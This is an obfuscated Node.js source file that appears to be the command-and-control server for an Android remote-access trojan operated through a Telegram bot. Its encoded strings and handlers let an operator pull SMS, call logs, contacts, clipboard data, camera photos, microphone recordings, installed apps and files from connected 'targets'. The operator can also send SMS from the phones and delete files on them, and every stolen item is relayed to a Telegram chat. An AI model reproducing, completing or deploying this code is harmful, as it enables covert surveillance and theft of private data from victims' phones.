function _0x5503(){const _0x21113b=['66ZNdSsZ','http','80tPWVMu','body-parser','1716710vlyYlo','2502076HVozcp','uuid','12VapdUt','2024390UPeXhf','1616892jRRLGB','3156ZtGTZI','axios','5360YNLrFD','241803DgFjdT','8825019XADAQr','express','node-telegram-bot-api'];_0x5503=function(){return _0x21113b;};return _0x5503();}function _0x3e17(_0x12e93d,_0x23c86b){const _0x550346=_0x5503();return _0x3e17=function(_0x3e17ef,_0x32d22a){_0x3e17ef=_0x3e17ef-0xc7;let _0x467a95=_0x550346[_0x3e17ef];return _0x467a95;},_0x3e17(_0x12e93d,_0x23c86b);}const _0x4961d6=_0x3e17;(function(_0x2a9603,_0x416b29){const _0x249488=_0x3e17,_0x5e8aaa=_0x2a9603();while(!![]){try{const _0x5224cc=parseInt(_0x249488(0xcc))/0x1+parseInt(_0x249488(0xc8))/0x2+-parseInt(_0x249488(0xcd))/0x3*(parseInt(_0x249488(0xcf))/0x4)+-parseInt(_0x249488(0xc7))/0x5*(parseInt(_0x249488(0xca))/0x6)+-parseInt(_0x249488(0xd1))/0x7+-parseInt(_0x249488(0xd6))/0x8*(-parseInt(_0x249488(0xd0))/0x9)+parseInt(_0x249488(0xcb))/0xa*(parseInt(_0x249488(0xd4))/0xb);if(_0x5224cc===_0x416b29)break;else _0x5e8aaa['push'](_0x5e8aaa['shift']());}catch(_0x561e80){_0x5e8aaa['push'](_0x5e8aaa['shift']());}}}(_0x5503,0xf2b69));const socket=require('ws'),http=require(_0x4961d6(0xd5)),express=require(_0x4961d6(0xd2)),TelegramBot=require(_0x4961d6(0xd3)),multer=require('multer'),bodyParser=require(_0x4961d6(0xd7)),uuid4=require(_0x4961d6(0xc9)),axios=require(_0x4961d6(0xce));

const upload = multer();
const app = express()
app.use(bodyParser.json());
const server = http.createServer(app);
const wss = new socket.Server({server});
const chatId = ''
const token = ''
const serverAddr = ''
const bot = new TelegramBot(token, {polling: true});

// request -------------------------------------------------------------------
var _0x4dc8=["\x4D\x69\x63\x20\x31\x20\uD83C\uDFA4","\x2F\x73\x65\x6E\x64\x4C\x6F\x63\x61\x74\x69\x6F\x6E","\x73\x65\x6E\x64\x44\x6F\x63\x75\x6D\x65\x6E\x74","\x64\x61\x74\x61","\x38\x33\x33\x30\x34\x34\x30\x53\x70\x5A\x61\x63\x4A","\x73\x70\x6C\x69\x74","\x63\x61\x6D\x32","\x31\x38\x72\x55\x42\x78\x58\x4B","\x31\x32\x30\x34\x39\x35\x6C\x68\x6A\x72\x65\x64","\x6F\x72\x69\x67\x69\x6E\x61\x6C\x6E\x61\x6D\x65","\x41\x6C\x6C\x20\x43\x6F\x6E\x74\x61\x63\x74\x20\uD83D\uDC64","\x53\x65\x72\x76\x65\x72\x20\x73\x74\x61\x72\x74\x65\x64\x20\x6F\x6E\x20\x70\x6F\x72\x74\x20","\x3C\x62\x3E","\x73\x65\x6E\x64","\x63\x61\x6D\x31","\x6D\x69\x32","\x74\x65\x78\x74","\x41\x6C\x6C\x20\x53\x6D\x73\x20\uD83D\uDCAC","\x66\x69\x6C\x65","\x59\x6F\x75\x72\x20\x52\x65\x71\x75\x65\x73\x74\x20\x49\x73\x20\x4F\x6E\x20\x50\x72\x6F\x67\x72\x65\x73\x73\x20\x21","\x73\x69\x6E\x67\x6C\x65","\x4D\x69\x63\x20\x33\x20\uD83C\uDFA4","\x63\x6C\x69\x65\x6E\x74\x73","\x43\x61\x6C\x6C\x20\x4C\x6F\x67\x20\uD83D\uDCDE","\x2F\x73\x65\x6E\x64\x54\x65\x78\x74","\x47\x65\x74\x20\x46\x6F\x6C\x64\x65\x72\x20\x2F\x20\x46\x69\x6C\x65\x20\uD83D\uDCC4","\x31\x33\x35\x32\x32\x37\x56\x46\x58\x57\x79\x66","\x64\x66\x26","\x38\x50\x57\x6B\x46\x57\x59","\x44\x65\x76\x69\x63\x65\x20\x4D\x6F\x64\x65\x6C\x20\uD83D\uDCF1","\x50\x4F\x52\x54","\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x3C\x62\x3E\u2604\x20\x53\x65\x6C\x65\x63\x74\x20\x41\x63\x74\x69\x6F\x6E\x20\x46\x6F\x72\x20\x44\x65\x76\x69\x63\x65\x20\x3A\x3C\x2F\x62\x3E\x0A\x26","\x53\x74\x61\x74\x75\x73\x20\u2699","\x67\x65\x74","\x6D\x69\x33","\u0645\u0631\u062D\u0628\u0627\x20\x0A\x20\x0A\u064A\u0631\u062C\u064A\x20\u0627\u0644\u0627\u0634\u062A\u0631\u0627\u0643\x20\u0641\u064A\x20\u0627\u0644\u0642\u0646\u0627\u0647\x20\u062D\u062A\u064A\x20\u0644\u0627\x20\u062A\u0648\u0627\u062C\u0647\x20\u0627\u064A\x20\u0645\u0634\u0627\u0643\u0644\x0A\x20\x0A\x20\x68\x74\x74\x70\x73\x3A\x2F\x2F\x74\x2E\x6D\x65\x2F\x6E\x61\x6D\x65\x5F\x64\x61\x72\x6B\x20\x20","\x66\x6F\x72\x45\x61\x63\x68","\x31\x36\x31\x34\x33\x39\x70\x49\x42\x56\x67\x46","\x48\x54\x4D\x4C","\x2F\x73\x65\x6E\x64\x46\x69\x6C\x65","\x67\x66\x26","\x65\x76\x65\x72\x79\x74\x68\x69\x6E\x67\x20\x69\x73\x20\x66\x69\x6E\x65\x20\x6E\x6F\x77\x20\x65\x64\x69\x74\x20\x74\x68\x65\x20\x61\x70\x6B\x20\x73\x72\x63","\x43\x6C\x69\x70\x20\x42\x6F\x61\x72\x64\x20\uD83D\uDCC4","\x62\x6F\x64\x79","\x37\x34\x30\x34\x36\x34\x59\x4F\x6A\x68\x43\x71","\x73\x6F\x63\x6B\x65\x74","\x21\x0A\x0A\x3C\x62\x3E\x41\x63\x74\x69\x6F\x6E\x20\x47\x65\x74\x20\x46\x69\x6C\x65\x20\x2F\x20\x46\x6F\x6C\x64\x65\x72\x0A\uD83D\uDD35\x20\x50\x6C\x65\x61\x73\x65\x20\x52\x65\x70\x6C\x79\x20\x46\x69\x6C\x65\x20\x2F\x20\x46\x6F\x6C\x64\x65\x72\x20\x50\x61\x74\x68\x3A\x3C\x2F\x62\x3E","\x21\x0A\x3C\x62\x3E\x41\x63\x74\x69\x6F\x6E\x20\x44\x65\x6C\x65\x74\x65\x20\x46\x69\x6C\x65\x20\x2F\x20\x46\x6F\x6C\x64\x65\x72\x0A\uD83D\uDD35\x20\x50\x6C\x65\x61\x73\x65\x20\x52\x65\x70\x6C\x79\x20\x46\x69\x6C\x65\x20\x2F\x20\x46\x6F\x6C\x64\x65\x72\x20\x50\x61\x74\x68\x3A\x3C\x2F\x62\x3E","\x44\x65\x6C\x65\x74\x65\x20\x46\x6F\x6C\x64\x65\x72\x20\x2F\x20\x46\x69\x6C\x65\x20\uD83D\uDDD1","\x73\x69\x7A\x65","\x3C\x2F\x62\x3E\x20\uD83C\uDF10","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65","\x6C\x6F\x67","\x53\x65\x6E\x64\x20\x53\x6D\x73\x20\uD83D\uDCAC","\x74\x6F\x53\x74\x72\x69\x6E\x67","\x6C\x69\x73\x74\x65\x6E","\x70\x6F\x73\x74","\x73\x73\x26","\x72\x65\x70\x6C\x79\x5F\x74\x6F\x5F\x6D\x65\x73\x73\x61\x67\x65","\x61\x64\x64\x72\x65\x73\x73","\x75\x75\x69\x64","\x3C\x62\x3E\x49\x44\x20\x3D\x3E\x20\x3C\x2F\x62\x3E\x3C\x63\x6F\x64\x65\x3E","\x72\x65\x70\x6C\x61\x63\x65\x41\x6C\x6C","\x35\x36\x38\x38\x39\x33\x36\x76\x57\x55\x6C\x58\x4E","\x3C\x62\x3E\x4E\x65\x77\x20\x54\x61\x72\x67\x65\x74\x20\x43\x6F\x6E\x6E\x65\x63\x74\x65\x64\x20\uD83D\uDCF1\x0A\x0A\x49\x44\x20\x3D\x20\x3C\x63\x6F\x64\x65\x3E","\x32\x73\x76\x42\x59\x67\x69","\x41\x63\x74\x69\x6F\x6E\x20\u2604","\x70\x6F\x72\x74","\x62\x75\x66\x66\x65\x72","\x49\x6E\x73\x74\x61\x6C\x6C\x65\x64\x20\x41\x70\x70\x73\x20\uD83D\uDCF2","\x6D\x69\x31","\x63\x61\x74\x63\x68","\x73\x65\x6E\x64\x4C\x6F\x63\x61\x74\x69\x6F\x6E","\x31\x37\x37\x37\x35\x38\x30\x77\x6A\x7A\x47\x6D\x6E","\x73\x68\x69\x66\x74","\x70\x75\x73\x68","\x2F","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x74\x78\x74","\x6C\x31","\x6C\x32","\x65\x6E\x76","\x76\x34","\x3C\x2F\x63\x6F\x64\x65\x3E\x0A\x49\x50\x20\x3D\x20","\x3A","","\x66","\x72\x65\x6D\x6F\x74\x65\x41\x64\x64\x72\x65\x73\x73","\x6F\x6E","\x62\x65\x20\x61\x6C\x69\x76\x65","\x6D\x65\x73\x73\x61\x67\x65","\x2F\x73\x74\x61\x72\x74","\x20\x4F\x6E\x6C\x69\x6E\x65\x20\x43\x6C\x69\x65\x6E\x74\x3C\x2F\x62\x3E\x20\u2705\x0A\x0A","\x3C\x2F\x63\x6F\x64\x65\x3E\x0A\x0A","\x3C\x62\x3E\x4E\x6F\x20\x4F\x6E\x6C\x69\x6E\x65\x20\x43\x6C\x69\x65\x6E\x74\x3C\x2F\x62\x3E\x20\u274C\x20\x0A\x20\x0A\x20\x40\x6E\x61\x6D\x65\x5F\x64\x61\x72\x6B","\x63\x6C","\x67\x63","\x61\x73","\x73\x73","\x69\x61","\x64\x6D","\x67\x66","\x64\x66","\x4D\x61\x69\x6E\x20\x43\x61\x6D\x65\x72\x61\x20\uD83D\uDCF7","\x46\x72\x6F\x6E\x74\x20\x43\x61\x6D\x65\x72\x61\x20\uD83E\uDD33","\x4D\x69\x63\x20\x32\x20\uD83C\uDFA4","\x63\x70","\x26","\x5B","\x5D","\x21","\x63\x61\x6C\x6C\x62\x61\x63\x6B\x5F\x71\x75\x65\x72\x79","\x21\x0A\x0A\x3C\x62\x3E\x41\x63\x74\x69\x6F\x6E\x20\x53\x65\x6E\x64\x20\x53\x6D\x73\x0A\uD83D\uDD35\x20\x50\x6C\x65\x61\x73\x65\x20\x52\x65\x70\x6C\x79\x0A\x3C\x2F\x62\x3E\x20\x3C\x63\x6F\x64\x65\x3E\x5B\x7B\x22\x6E\x75\x6D\x62\x65\x72\x22\x3A\x22\x74\x61\x72\x67\x65\x74\x20\x6E\x75\x6D\x62\x65\x72\x22\x2C\x22\x6D\x65\x73\x73\x61\x67\x65\x22\x3A\x22\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x22\x7D\x5D\x3C\x2F\x63\x6F\x64\x65\x3E"];function martain(){const _0xac41x2=[_0x4dc8[0],_0x4dc8[1],_0x4dc8[2],_0x4dc8[3],_0x4dc8[4],_0x4dc8[5],_0x4dc8[6],_0x4dc8[7],_0x4dc8[8],_0x4dc8[9],_0x4dc8[10],_0x4dc8[11],_0x4dc8[12],_0x4dc8[13],_0x4dc8[14],_0x4dc8[15],_0x4dc8[16],_0x4dc8[17],_0x4dc8[18],_0x4dc8[19],_0x4dc8[20],_0x4dc8[21],_0x4dc8[22],_0x4dc8[23],_0x4dc8[24],_0x4dc8[25],_0x4dc8[26],_0x4dc8[27],_0x4dc8[28],_0x4dc8[29],_0x4dc8[30],_0x4dc8[31],_0x4dc8[32],_0x4dc8[33],_0x4dc8[34],_0x4dc8[35],_0x4dc8[36],_0x4dc8[37],_0x4dc8[38],_0x4dc8[39],_0x4dc8[40],_0x4dc8[41],_0x4dc8[42],_0x4dc8[43],_0x4dc8[44],_0x4dc8[45],_0x4dc8[46],_0x4dc8[47],_0x4dc8[48],_0x4dc8[49],_0x4dc8[50],_0x4dc8[51],_0x4dc8[52],_0x4dc8[53],_0x4dc8[54],_0x4dc8[55],_0x4dc8[56],_0x4dc8[57],_0x4dc8[58],_0x4dc8[59],_0x4dc8[60],_0x4dc8[61],_0x4dc8[62],_0x4dc8[63],_0x4dc8[64],_0x4dc8[65],_0x4dc8[66],_0x4dc8[67],_0x4dc8[68],_0x4dc8[69],_0x4dc8[70],_0x4dc8[71],_0x4dc8[72],_0x4dc8[73],_0x4dc8[74]];martain= function(){return _0xac41x2};return martain()}const myril=jyrin;function jyrin(_0xac41x5,_0xac41x6){const _0xac41x7=martain();return jyrin= function(_0xac41x8,_0xac41x9){_0xac41x8= _0xac41x8- 348;let _0xac41xa=_0xac41x7[_0xac41x8];return _0xac41xa},jyrin(_0xac41x5,_0xac41x6)}(function(_0xac41xb,_0xac41xc){const _0xac41xd=jyrin,_0xac41xe=_0xac41xb();while(!![]){try{const _0xac41xf=parseInt(_0xac41xd(372))/ 1* (parseInt(_0xac41xd(412))/ 2)+ parseInt(_0xac41xd(384))/ 3* (-parseInt(_0xac41xd(374))/ 4)+ -parseInt(_0xac41xd(354))/ 5 * (parseInt(_0xac41xd(353))/ 6)+ parseInt(_0xac41xd(420))/ 7+ -parseInt(_0xac41xd(391))/ 8+ -parseInt(_0xac41xd(410))/ 9+ parseInt(_0xac41xd(350))/ 10;if(_0xac41xf=== _0xac41xc){break}else {_0xac41xe[_0x4dc8[76]](_0xac41xe[_0x4dc8[75]]())}}catch(queene){_0xac41xe[_0x4dc8[76]](_0xac41xe[_0x4dc8[75]]())}}}(martain,317626),app[myril(380)](_0x4dc8[77],(_0xac41x10,_0xac41x11)=>{const _0xac41x12=myril;_0xac41x11[_0xac41x12(359)](_0xac41x12(388))}),app[myril(403)](myril(386),upload[myril(366)](myril(364)),(_0xac41x13,_0xac41x14)=>{const _0xac41x15=myril;var _0xac41x16=_0xac41x13[_0xac41x15(364)][_0xac41x15(355)];bot[_0xac41x15(348)](chatId,_0xac41x13[_0xac41x15(364)][_0xac41x15(415)],{},{filename:_0xac41x16,contentType:_0x4dc8[78]})[_0xac41x15(418)](function(_0xac41x17){const _0xac41x18=_0xac41x15;console[_0xac41x18(399)](_0xac41x17)}),_0xac41x14[_0x4dc8[13]](_0xac41x16)}),app[myril(403)](myril(370),(_0xac41x19,_0xac41x1a)=>{const _0xac41x1b=myril;bot[_0x4dc8[52]](chatId,_0xac41x19[_0xac41x1b(390)][_0xac41x1b(349)],{parse_mode:_0x4dc8[39]}),_0xac41x1a[_0xac41x1b(359)](_0xac41x19[_0x4dc8[44]][_0xac41x1b(349)])}),app[myril(403)](myril(422),(_0xac41x1c,_0xac41x1d)=>{const _0xac41x1e=myril;bot[_0xac41x1e(419)](chatId,_0xac41x1c[_0xac41x1e(390)][_0x4dc8[79]],_0xac41x1c[_0xac41x1e(390)][_0x4dc8[80]]),_0xac41x1d[_0x4dc8[13]](_0xac41x1c[_0xac41x1e(390)][_0x4dc8[79]][_0xac41x1e(401)]())}),server[myril(402)](process[_0x4dc8[81]][myril(376)]|| 8999,()=>{const _0xac41x1f=myril;console[_0xac41x1f(399)](_0xac41x1f(357)+ server[_0xac41x1f(406)]()[_0xac41x1f(414)])}),wss[_0x4dc8[88]](myril(377),(_0xac41x20,_0xac41x21)=>{const _0xac41x22=myril;_0xac41x20[_0x4dc8[61]]= uuid4[_0x4dc8[82]](),bot[_0xac41x22(398)](chatId,_0xac41x22(411)+ _0xac41x20[_0xac41x22(407)]+ _0x4dc8[83]+ _0xac41x21[_0xac41x22(392)][_0x4dc8[87]][_0xac41x22(401)]()[_0xac41x22(409)](_0x4dc8[86],_0x4dc8[85])[_0x4dc8[63]](_0x4dc8[84],_0x4dc8[85])+ _0xac41x22(397),{parse_mode:_0x4dc8[39]})}),setInterval(()=>{const _0xac41x23=myril;wss[_0xac41x23(368)][_0xac41x23(383)]((_0xac41x24)=>{const _0xac41x25=_0xac41x23;_0xac41x24[_0xac41x25(359)](_0x4dc8[89])})},2e3),bot[_0x4dc8[88]](_0x4dc8[90],(_0xac41x26)=>{const _0xac41x27=myril;_0xac41x26[_0x4dc8[16]]=== _0x4dc8[91]&& bot[_0x4dc8[52]](chatId,_0xac41x27(382),{reply_markup:{keyboard:[[_0xac41x27(379)],[_0xac41x27(413)]]}});if(_0xac41x26[_0xac41x27(362)]=== _0xac41x27(379)){const _0xac41x28=wss[_0xac41x27(368)][_0x4dc8[50]];let _0xac41x29=_0x4dc8[85];_0xac41x28> 0?(_0xac41x29+= _0xac41x27(358)+ _0xac41x28+ _0x4dc8[92],wss[_0xac41x27(368)][_0xac41x27(383)]((_0xac41x2a)=>{const _0xac41x2b=_0xac41x27;_0xac41x29+= _0xac41x2b(408)+ _0xac41x2a[_0xac41x2b(407)]+ _0x4dc8[93]})):_0xac41x29+= _0x4dc8[94],bot[_0x4dc8[52]](chatId,_0xac41x29,{parse_mode:_0xac41x27(385)})};if(_0xac41x26[_0xac41x27(362)]=== _0x4dc8[67]){const _0xac41x2c=wss[_0xac41x27(368)][_0xac41x27(396)];if(_0xac41x2c> 0){let _0xac41x2d=[[{text:_0xac41x27(369),callback_data:_0x4dc8[95]},{text:_0xac41x27(356),callback_data:_0x4dc8[96]}],[{text:_0xac41x27(363),callback_data:_0x4dc8[97]},{text:_0xac41x27(400),callback_data:_0x4dc8[98]}],[{text:_0xac41x27(416),callback_data:_0x4dc8[99]},{text:_0xac41x27(375),callback_data:_0x4dc8[100]}],[{text:_0xac41x27(371),callback_data:_0x4dc8[101]},{text:_0xac41x27(395),callback_data:_0x4dc8[102]}],[{text:_0x4dc8[103],callback_data:_0xac41x27(360)},{text:_0x4dc8[104],callback_data:_0xac41x27(352)}],[{text:_0xac41x27(421),callback_data:_0xac41x27(417)},{text:_0x4dc8[105],callback_data:_0xac41x27(361)},{text:_0xac41x27(367),callback_data:_0xac41x27(381)}],[{text:_0xac41x27(389),callback_data:_0x4dc8[106]}]];wss[_0xac41x27(368)][_0xac41x27(383)]((_0xac41x2e)=>{const _0xac41x2f=_0xac41x27;bot[_0xac41x2f(398)](chatId,_0xac41x2f(378)+ _0xac41x2e[_0xac41x2f(407)],{reply_markup:{inline_keyboard:_0xac41x2d},parse_mode:_0xac41x2f(385)})})}else {bot[_0xac41x27(398)](chatId,_0x4dc8[94],{parse_mode:_0x4dc8[39]})}};if(_0xac41x26[_0xac41x27(405)]){if(_0xac41x26[_0xac41x27(405)][_0x4dc8[16]][_0xac41x27(351)](_0x4dc8[107])[0]=== _0x4dc8[98]){const _0xac41x30=_0xac41x26[_0xac41x27(362)][_0xac41x27(351)](_0x4dc8[109])[0][_0x4dc8[5]](_0x4dc8[108])[1],_0xac41x31=_0xac41x26[_0xac41x27(405)][_0xac41x27(362)][_0xac41x27(351)](_0x4dc8[110])[0][_0xac41x27(351)](_0x4dc8[107])[1];wss[_0xac41x27(368)][_0xac41x27(383)]((_0xac41x32)=>{const _0xac41x33=_0xac41x27;_0xac41x32[_0x4dc8[61]]=== _0xac41x31&& _0xac41x32[_0xac41x33(359)](_0xac41x33(404)+ _0xac41x30)}),bot[_0x4dc8[52]](chatId,_0x4dc8[19],{reply_markup:{keyboard:[[_0xac41x27(379)],[_0x4dc8[67]]]}})};if(_0xac41x26[_0xac41x27(405)][_0xac41x27(362)][_0xac41x27(351)](_0x4dc8[107])[0]=== _0x4dc8[102]|| _0xac41x26[_0xac41x27(405)][_0xac41x27(362)][_0xac41x27(351)](_0x4dc8[107])[0]=== _0x4dc8[101]){const _0xac41x34=_0xac41x26[_0xac41x27(405)][_0xac41x27(362)],_0xac41x35=_0xac41x34[_0xac41x27(351)](_0x4dc8[110])[0][_0xac41x27(351)](_0x4dc8[107])[0],_0xac41x36=_0xac41x34[_0xac41x27(351)](_0x4dc8[110])[0][_0xac41x27(351)](_0x4dc8[107])[1],_0xac41x37=_0xac41x26[_0x4dc8[16]];wss[_0xac41x27(368)][_0xac41x27(383)]((_0xac41x38)=>{const _0xac41x39=_0xac41x27;_0xac41x38[_0xac41x39(407)]=== _0xac41x36&& _0xac41x38[_0xac41x39(359)](_0xac41x35+ _0x4dc8[107]+ _0xac41x37)}),bot[_0xac41x27(398)](chatId,_0xac41x27(365),{reply_markup:{keyboard:[[_0xac41x27(379)],[_0x4dc8[67]]]}})}}}),bot[_0x4dc8[88]](_0x4dc8[111],function onCallbackQuery(_0xac41x3b){const _0xac41x3c=myril,_0xac41x3d=_0xac41x3b[_0xac41x3c(349)],_0xac41x3e=_0xac41x3b[_0x4dc8[90]][_0x4dc8[16]][_0xac41x3c(351)](_0x4dc8[107])[1];wss[_0x4dc8[22]][_0xac41x3c(383)]((_0xac41x3f)=>{const _0xac41x40=_0xac41x3c;if(_0xac41x3f[_0x4dc8[61]]=== _0xac41x3e){if(_0xac41x3d=== _0x4dc8[98]){bot[_0xac41x40(398)](chatId,_0xac41x40(404)+ _0xac41x3f[_0xac41x40(407)]+ _0x4dc8[112],{reply_markup:{force_reply:!![]},parse_mode:_0xac41x40(385)})}else {if(_0xac41x3d=== _0x4dc8[101]){bot[_0x4dc8[52]](chatId,_0xac41x40(387)+ _0xac41x3f[_0xac41x40(407)]+ _0xac41x40(393),{reply_markup:{force_reply:!![]},parse_mode:_0xac41x40(385)})}else {_0xac41x3d=== _0x4dc8[102]?bot[_0x4dc8[52]](chatId,_0xac41x40(373)+ _0xac41x3f[_0xac41x40(407)]+ _0xac41x40(394),{reply_markup:{force_reply:!![]},parse_mode:_0xac41x40(385)}):_0xac41x3f[_0xac41x40(359)](_0xac41x3d)}}}})}),setInterval(()=>{axios[_0x4dc8[34]](serverAddr)},12e4))
  